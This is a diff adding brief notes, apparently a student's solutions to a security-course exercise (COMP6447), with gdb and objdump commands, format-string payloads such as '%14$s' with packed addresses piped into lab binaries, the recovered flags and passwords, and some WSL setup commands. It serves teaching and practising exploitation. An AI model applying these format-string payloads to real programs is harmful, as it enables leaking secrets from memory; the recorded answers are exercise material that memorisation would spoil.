@@ -1,0 +1,24 @@
+
+x/s (char *)secret
+objdump -s -j .debug_str demo.exe
+
+q1
+%8$s
+python -c 'print("\x20\x87\x04\x08 %14$s")' | ./easy
+COMP6447_ADMIN
+
+q2
+info variables 
+python -c 'print("\x60\xa0\x04\x08 %14$s")' | ./medium
+COMP6447_SUPER_SECRET_ADMIN
+python -c 'print("\xa0\xa0\x04\x08 %14$s")' | ./medium
+TOPSECRETPASSWORD
+
+q3
+%33$d %34$d
+ENROL_IN_COMP6447
+
+nano ~/.bashrc
+source ~/.bashrc
+startxfce4
+wsl --shutdown
